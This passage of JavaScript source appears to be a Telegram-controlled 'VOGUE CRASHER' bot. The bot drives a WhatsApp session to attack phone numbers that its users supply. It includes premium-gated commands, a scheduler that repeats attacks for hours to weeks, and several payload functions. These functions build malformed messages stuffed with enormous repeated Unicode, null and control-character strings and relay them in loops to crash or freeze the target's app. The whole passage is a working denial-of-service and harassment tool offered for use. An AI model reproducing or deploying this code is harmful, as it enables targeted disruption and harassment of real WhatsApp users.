                        );
                    }
                }

                console.log(
`[WORKER ${instanceId}] Done for ${clean}`
                );

            })();

        } catch (error) {

            ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 EXECUTION FAILED 〕

The system failed to
execute the request.

━━━━━━━━━━━━━━━━━━━━━━

Please verify :
◈ Target Input
◈ Connection State
◈ Module Engine

━━━━━━━━━━━━━━━━━━━━━━

System Status :
FAILED
`
            );

            console.log(
`[VOGUE CRASHER] ${error.message}`
            );

            await restartBot(
                "Connection Closed"
            );
        }
});

bot.command("hardcrash", checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {

        try {

            const args =
                ctx.message.text.split(" ");

            const number =
                args[1];

            const duration =
                args[2];

            // =====================
            // VALIDATION
            // =====================

            if (
                !number ||
                !duration
            ) {

                return ctx.reply(

`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • MESSAGE
━━━━━━━━━━━━━━━━━━━━━━

Usage :
/hardcrash number duration

━━━━━━━━━━━━━━━━━━━━━━

Example :
/hardcrash 628xxxx 1h

━━━━━━━━━━━━━━━━━━━━━━

Supported Duration :

◈ 1h
◈ 1d
◈ 1w

━━━━━━━━━━━━━━━━━━━━━━
`
                );
            }

            // =====================
            // PARSE DURATION
            // =====================

            const ms =
                parseDuration(
                    duration
                );

            if (!ms) {

                return ctx.reply(
                    "Invalid duration."
                );
            }

            // =====================
            // FORMAT TARGET
            // =====================

            const clean =
                number.replace(
                    /[^0-9]/g,
                    ""
                );

            const target =
                clean +
                "@s.whatsapp.net";

            // =====================
            // LOAD TASKS
            // =====================

            const tasks =
                loadTasks();

            // =====================
            // PREVENT DUPLICATE
            // =====================

            const exists =
                tasks.find(
                    x =>

                    x.type ===
                        "hardcrash"

                    &&

                    x.target ===
                        target

                    &&

                    x.active
                );

            if (exists) {

                return ctx.reply(

`
━━━━━━━━━━━━━━━━━━━━━━
TASK ALREADY ACTIVE
━━━━━━━━━━━━━━━━━━━━━━

Target :
${clean}

━━━━━━━━━━━━━━━━━━━━━━
`
                );
            }

            // =====================
            // CREATE TASK
            // =====================

            const task = {
                id: Date.now(),
                type: "hardcrash",
                target,
                number: clean,
                interval: 300000,
                batch: 10,
                createdAt: Date.now(),
                endTime: Date.now() + ms,
                lastRun: 0,
                active: true,
                running: false,
                startedAt: 0
            };

            // =====================
            // SAVE TASK
            // =====================

            tasks.push(task);

            saveTasks(tasks);

            // =====================
            // SUCCESS MESSAGE
            // =====================

            await ctx.replyWithPhoto(
                thumbnailUrl,

                {
                    caption:

`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 TASK CREATED 〕

◈ Type :
hardcrash

◈ Target :
${clean}

◈ Duration :
${duration}

━━━━━━━━━━━━━━━━━━━━━━

Task successfully added to persistent scheduler.

━━━━━━━━━━━━━━━━━━━━━━

System Status :
ACTIVE
\`\`\`
`,
                    parse_mode:
                        "Markdown"
                }
            );

        } catch (err) {

            console.log(err);

            ctx.reply(
                `ERROR\n\n${err.message}`
            );
        }
    }
);

//    ______ _   _ _   _ _____ _____ _____ _____ _   _ 
//    |  ___| | | | \ | /  __ \_   _|_   _|  _  | \ | |
//    | |_  | | | |  \| | /  \/ | |   | | | | | |  \| |
//    |  _| | | | | . ` | |     | |   | | | | | | . ` |
//    | |   | |_| | |\  | \__/\ | |  _| |_\ \_/ / |\  |
//    \_|    \___/\_| \_/\____/ \_/  \___/ \___/\_| \_/
//                                                     
//                                                     
//    ______ _   _ _____                               
//    | ___ \ | | |  __ \                              
//    | |_/ / | | | |  \/                              
//    | ___ \ | | | | __                               
//    | |_/ / |_| | |_\ \                              
//    \____/ \___/ \____/                              
//                                                     
//

function loadTasks() {
    
    if (
        !fs.existsSync(TASK_FILE)
    ) {
        return [];
    }
    
    return JSON.parse(
        fs.readFileSync(
            TASK_FILE,
            "utf8"
        )
    );
}

function saveTasks(data) {
    
    fs.writeFileSync(
        TASK_FILE,
        
        JSON.stringify(
            data,
            null,
            2
        )
    );
}

function parseDuration(input) {
    
    const match =
        input.match(
            /^(\d+)(m|h|d|w)$/i
        );
    
    if (!match) {
        return null;
    }
    
    const value =
        parseInt(match[1]);
    
    const unit =
        match[2].toLowerCase();
    
    const units = {
        
        m: 60000,
        h: 3600000,
        d: 86400000,
        w: 604800000
    };
    
    return value * units[unit];
}

function loadQueue() {

    try {

        if (!fs.existsSync(queueFile)) {
            fs.writeFileSync(
                queueFile,
                JSON.stringify([], null, 2)
            );
        }

        const data =
            fs.readFileSync(queueFile);

        spamQueue =
            JSON.parse(data);

    } catch {

        spamQueue = [];
    }
}

function saveQueue() {

    fs.writeFileSync(
        queueFile,
        JSON.stringify(
            spamQueue,
            null,
            2
        )
    );
}

function addQueue(data) {

    spamQueue.push(data);

    saveQueue();
}

function removeFirstQueue() {

    spamQueue.shift();

    saveQueue();
}

function compareVersions(v1, v2) {
    
    const num1 =
        parseFloat(v1);
    
    const num2 =
        parseFloat(v2);
    
    if (num1 > num2) {
        return 1;
    }
    
    if (num1 < num2) {
        return -1;
    }
    
    return 0;
}

async function executeTask(task) {
    switch (task.type) {

        // =====================
        // SEND MESSAGE
        // =====================

        case "hardcrash":

            for (let i = 0;i < task.batch;i++) {
                try {
                    await VogueInvisCrash(sock, task.target);
                    await sleep(1800);
                } catch (e) {

                    console.log(
                        `[CRASH ERROR]
${e.message}`
                    );
                }
            }

        break;

        // =====================
        // SEND IMAGE
        // =====================

        case "sendimage":

            for (
                let i = 0;
                i < task.batch;
                i++
            ) {

                try {

                    await sendImage(
                        sock,
                        task.target
                    );

                    await sleep(1500);

                } catch (e) {

                    console.log(
                        `[SENDIMAGE ERROR]
${e.message}`
                    );
                }
            }

        break;

        // =====================
        // BACKUP
        // =====================

        case "backup":

            try {

                await runBackup();

            } catch (e) {

                console.log(
                    `[BACKUP ERROR]
${e.message}`
                );
            }

        break;

        // =====================
        // DEFAULT
        // =====================

        default:

            console.log(
                `[UNKNOWN TASK]
${task.type}`
            );
    }
}

async function startUniversalWorker() {

    if (workerStarted) {
        return;
    }

    workerStarted = true;

    console.log(
        "[VOGUE CRASHER] initializing Done!"
    );

    setInterval(async () => {

        let tasks =
            loadTasks();
            
        if (!tasks.length) {
            return console.log("[VOGUE CRASHER] No task loaded!");
        }

        let changed =
            false;

        for (const task of tasks) {

            // =====================
            // SKIP INACTIVE
            // =====================

            if (!task.active) {
                continue;
            }

            // =====================
            // FIX STUCK TASK
            // =====================

            if (
                task.running &&
                Date.now() -
                (task.startedAt || 0) >
                600000
            ) {

                task.running = false;

                console.log(
                    `[TASK RESET]
${task.id}`
                );

                changed = true;
            }

            // =====================
            // PREVENT OVERLAP
            // =====================

            if (task.running) {
                continue;
            }

            // =====================
            // EXPIRED
            // =====================

            if (
                Date.now() >=
                task.endTime
            ) {

                task.active = false;

                console.log(
                    `[TASK EXPIRED]
${task.type} -> ${task.number}`
                );

                changed = true;

                continue;
            }

            // =====================
            // INTERVAL CHECK
            // =====================

            if (
                Date.now() -
                task.lastRun <
                task.interval
            ) {
                continue;
            }

            try {

                // =====================
                // LOCK TASK
                // =====================

                task.running = true;

                task.startedAt =
                    Date.now();

                changed = true;

                console.log(
                    `[TASK START]
${task.type} -> ${task.number}`
                );

                // =====================
                // EXECUTE
                // =====================

                await executeTask(task);

                // =====================
                // SUCCESS
                // =====================

                task.lastRun =
                    Date.now();

                task.running = false;

                task.startedAt = 0;

                changed = true;

                console.log(
                    `[TASK DONE]
${task.type} -> ${task.number}`
                );

            } catch (err) {

                task.running = false;

                task.startedAt = 0;

                changed = true;

                console.log(
                    `[TASK ERROR]
${task.type}

${err.message}`
                );
            }
        }

        // =====================
        // SAVE
        // =====================

        if (changed) {
            saveTasks(tasks);
        }

    }, 10000);
}

async function restoreQueue() {

    loadQueue();

    if (!spamQueue.length) {

        console.log(
            "[QUEUE] No pending tasks"
        );

        return;
    }

    console.log(
        `[QUEUE] Restoring ${spamQueue.length} task(s) in 30 seconds`
    );

    await sleep(30000);

    processSpamQueue();
}

async function processSpamQueue() {
    
    if (queueRunning) return;
    
    queueRunning = true;
    
    while (spamQueue.length > 0) {
        
        const job =
            spamQueue[0];
        
        const {
            id,
            type,
            target,
            number
        } = job;
        
        const instanceId =
            Date.now() + Math.random();
        
        console.log(
            `[QUEUE ${id}] Starting ${type} -> ${number}`
        );
        
        try {
            
            // ========================================
            // HARDSPAM
            // ========================================
            
            if (
                type === "hardspam"
            ) {
                
                for (let i = 0; i < 20; i++) {
                    
                    try {
                        
                        await VogueSpamInvis(
                            sock,
                            target
                        );
                        
                        console.log(
                            `[HARDSPAM ${id}] Loop ${i + 1}/20`
                        );
                        
                        await sleep(
                            3000
                        );
                        
                    } catch (e) {
                        
                        console.log(
                            `[HARDSPAM ${id}] ${e.message}`
                        );
                        
                        await restartBot(
                            "Connection Closed"
                        );
                        
                        break;
                    }
                }
            }
            
            // ========================================
            // DELAYCOMBO
            // ========================================
            
            else if (
                type === "delaycombo"
            ) {
                
                try {
                    
                    await VogueBuldo(
                        sock,
                        target
                    );
                    
                    console.log(
                        `[DELAYCOMBO ${id}] Drainet sent`
                    );
                    
                } catch (e) {
                    
                    console.log(
                        `[DELAYCOMBO ${id}] Drainet Error ${e.message}`
                    );
                }
                
                for (let i = 0; i < 20; i++) {
                    
                    try {
                        
                        await VogueSpamInvis(
                            sock,
                            target
                        );
                        
                        console.log(
                            `[DELAYCOMBO ${id}] Loop ${i + 1}/20`
                        );
                        
                        await sleep(
                            3000
                        );
                        
                    } catch (e) {
                        
                        console.log(
                            `[DELAYCOMBO ${id}] ${e.message}`
                        );
                        
                        await restartBot(
                            "Connection Closed"
                        );
                        
                        break;
                    }
                }
            }
            
            else if (
                type === "vogcrash"
            ) {
                
                for (let i = 0; i < 10; i++) {
                    
                    try {
                        
                        await VogueInvisCrash(
                            sock,
                            target
                        );
                        
                        console.log(
                            `[VOGUE CRASH ${id}] Loop ${i + 1}/30`
                        );
                        
                        await sleep(
                            3000
                        );
                        
                    } catch (e) {
                        
                        console.log(
                            `[VOGUE CRASH ${id}] ${e.message}`
                        );
                        
                        await restartBot(
                            "Connection Closed"
                        );
                        
                        break;
                    }
                }
            }
            
            else if (
                type === "voguehard"
            ) {
                
                try {
                    
                    await VogueBuldo(
                        sock,
                        target
                    );
                    
                    console.log(
                        `[VOGUE HARD ${id}] Drainet sent`
                    );
                    
                } catch (e) {
                    
                    console.log(
                        `[VOGUE HARD ${id}] Drainet Error ${e.message}`
                    );
                }
                
                for (let i = 0; i < 30; i++) {
                    
                    try {
                        
                        await VogueHardInvis(
                            sock,
                            target
                        );
                        
                        console.log(
                            `[VOGUE HARD ${id}] Loop ${i + 1}/30`
                        );
                        
                        await sleep(
                            3000
                        );
                        
                    } catch (e) {
                        
                        console.log(
                            `[VOGUE HARD ${id}] ${e.message}`
                        );
                        
                        await restartBot(
                            "Connection Closed"
                        );
                        
                        break;
                    }
                }
            }
           
            
            console.log(
                `[QUEUE ${id}] Finished ${number}`
            );
            
            removeFirstQueue();
            
            // ========================================
            // DELAY NEXT TASK
            // ========================================
            
            if (
                spamQueue.length > 0
            ) {
                
                console.log(
                    `[QUEUE] Waiting 3 minutes before next task`
                );
                
                await sleep(
                    3 * 60 * 1000
                );
            }
            
        } catch (err) {
            
            console.log(
                `[QUEUE ERROR] ${err.message}`
            );
            
            removeFirstQueue();
        }
    }
    
    queueRunning = false;
}

async function restartBot(reason = "Unknown") {

    console.log(`
[VOGUE AUTO RESTART]

Reason : ${reason}
`);

    try {
        await destroySocket();
    } catch {}

    setTimeout(() => {
        process.exit(1);
    }, 2000);
}

async function CheckCooldown(ctx, next) {
    
    if (
        String(ctx.from.id) ===
        String(ownerID)
    ) {
        return next();
    }
    
    
    if (globalCooldown <= 0) {
        return next();
    }
    
    const command =
        ctx.update.message.text
        ?.split(" ")[0]
        ?.replace("/", "") || "unknown";
    
    const userId =
        String(ctx.from.id);
    
    const key =
        `${userId}:${command}`;
    
    const now =
        Date.now();
        
    const expires =
        cooldown.get(key);
    
    if (
        expires &&
        now < expires
    ) {
        
        const remaining =
            Math.ceil(
                (expires - now) / 1000
            );
        
        return ctx.reply(
            `\`\`\`ruby
GLOBAL COOLDOWN

Command  : ${command}
Remaining: ${remaining}s
Status   : Cooldown Active
\`\`\``,
            {
                parse_mode: "Markdown"
            }
        );
    }
    
    cooldown.set(
        key,
        now + (
            globalCooldown * 1000
        )
    );
    
    setTimeout(() => {
        cooldown.delete(key);
    }, globalCooldown * 1000);
    
    return next();
}

async function Ipongforcloseivs(sock, target) {
    const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
    const s = "𑇂𑆵𑆴𑆿".repeat(60000);
    try {
        let locationMessagex = {
            degreesLatitude: 11.11,
            degreesLongitude: -11.11,
            name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/elyssavirellequeenn",
        }
        let msgx = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    locationMessagex
                }
            }
        }, {});
        let extendMsgx = {
            extendedTextMessage: {
                text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
                matchedText: "helow",
                description: "𑇂𑆵𑆴𑆿".repeat(60000),
                title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
                previewType: "NONE",
                jpegThumbnail: "",
                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                mediaKeyTimestamp: "1743101489",
                thumbnailHeight: 641,
                thumbnailWidth: 640,
                inviteLinkGroupTypeV2: "DEFAULT"
            }
        }
        let msgx2 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    extendMsgx
                }
            }
        }, {});
        let locationMessage = {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
            url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
        }
        let msg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    locationMessage
                }
            }
        }, {});
        let extendMsg = {
            extendedTextMessage: {
                text: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + TravaIphone,
                matchedText: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢",
                description: "𑇂𑆵𑆴𑆿".repeat(25000),
                title: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + "𑇂𑆵𑆴𑆿".repeat(15000),
                previewType: "NONE",
                jpegThumbnail: "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",
                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                mediaKeyTimestamp: "1743101489",
                thumbnailHeight: 641,
                thumbnailWidth: 640,
                inviteLinkGroupTypeV2: "DEFAULT"
            }
        }
        let msg2 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    extendMsg
                }
            }
        }, {});
        let msg3 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    locationMessage
                }
            }
        }, {});
        
        for (let i = 0; i < 10; i++) {
            await sock.relayMessage('status@broadcast', msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            
            await sock.relayMessage('status@broadcast', msg2.message, {
                messageId: msg2.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            await sock.relayMessage('status@broadcast', msg.message, {
                messageId: msgx.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            await sock.relayMessage('status@broadcast', msg2.message, {
                messageId: msgx2.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            
            await sock.relayMessage('status@broadcast', msg3.message, {
                messageId: msg2.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            if (i < 9) {
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
        }
    } catch (err) {
        console.error(err);
    }
};

async function VogueSpamInvis(sock, target) {
  try {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];    
    for (const x of type) {
      const enty = Math.floor(Math.random() * type.length);
      const msg = generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "\u0003",
                  format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                  name: x,
                  paramsJson: "\x10".repeat(1000000),
                  version: 3
                },
                entryPointConversionSource: type[enty]
              }
            }
          }
        },
        {
          participant: { jid: target }
        }
      );
      
      await sock.relayMessage(
        target,
        {
          groupStatusMessageV2: {
            message: msg.message
          }
        },
        {
          messageId: msg.key.id,
          participant: { jid: target }
        }
      );
      
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  } catch (err) {
    await console.error(`${err.message}`);
  }
}

async function VogueBuldo(sock, target) {
    const totalAttack = 10;
    for (let i = 0; i < totalAttack; i++) {
        const MsgNew = {
    groupStatusMessageV2: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/701194605_979944131092122_1860918218284985201_n.enc?ccb=11-4&oh=01_Q5Aa4gE59mooNBmYLPOKcNT25wDzfB1ctLP8qfS5BxyUygCgbQ&oe=6A2E2184&_nc_sid=5e03e0&mms3=true",
          directPath: "/v/t62.7119-24/701194605_979944131092122_1860918218284985201_n.enc?ccb=11-4&oh=01_Q5Aa4gE59mooNBmYLPOKcNT25wDzfB1ctLP8qfS5BxyUygCgbQ&oe=6A2E2184&_nc_sid=5e03e0",
          mediaKey: Buffer.from("89lwViNcegystiWyPMjQd8MyzphI1OrGEKMqjbOJJGQ=", "base64"),
          fileEncSha256: Buffer.from("QH0ZymePSShq4wyl3u8FqVOQiXKAUaubDdhDSbQpy8Q=", "base64"),
          fileSha256: Buffer.from("5bhEzFf1cJTqRYXiNfNseMHNIiJiu4nVPJTctNaz5V0=", "base64"),
          mimetype: "application/msword",
          fileLength: "10485760",
          mediaKeyTimestamp: "1778818915",
          fileName: "꦳".repeat(12000),
          title: "\u0000".repeat(900000),
          pageCount: 999999999,
          contactVcard: false,
          thumbnailDirectPath: "/v/t62.7119-24/701194605_979944131092122_1860918218284985201_n.enc?ccb=11-4&oh=01_Q5Aa4gE59mooNBmYLPOKcNT25wDzfB1ctLP8qfS5BxyUygCgbQ&oe=6A2E2184&_nc_sid=5e03e0",
          thumbnailSha256: Buffer.from("5bhEzFf1cJTqRYXiNfNseMHNIiJiu4nVPJTctNaz5V0=", "base64"),
          thumbnailEncSha256: Buffer.from("QH0ZymePSShq4wyl3u8FqVOQiXKAUaubDdhDSbQpy8Q=", "base64"),
          thumbnailHeight: 100,
          thumbnailWidth: 100,
          caption: "",
          accessibilityLabel: "",
          mediaKeyDomain: 1,
          contextInfo: {
            urlTrackingMap: {
              urlTrackingMapElements: Array.from({ length: 1 }, () => ({}))
            },
            participants: Array.from({ length: 1 }, (_, n) => ({
              participant: `62${n + 829599}@s.whatsapp.net`
            }))
          }
        }
      }
    }
  };

  try {
    await sock.relayMessage(target, MsgNew, { participant: { jid: target } });
    console.log(`message success to ${target}`);
  } catch (e) {
    console.log("[!] Error Strike:", e);
    await restartBot("Connection Closed");
  }
  await sleep(1500)
}
}

async function VogueHardInvis(sock, target) {
    var msg = generateWAMessageFromContent(target, {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Pria Solo",
                        format: "EXTENSION"
                    },
                    nativeFlowResponseMessage: {
                        name: "address_message",
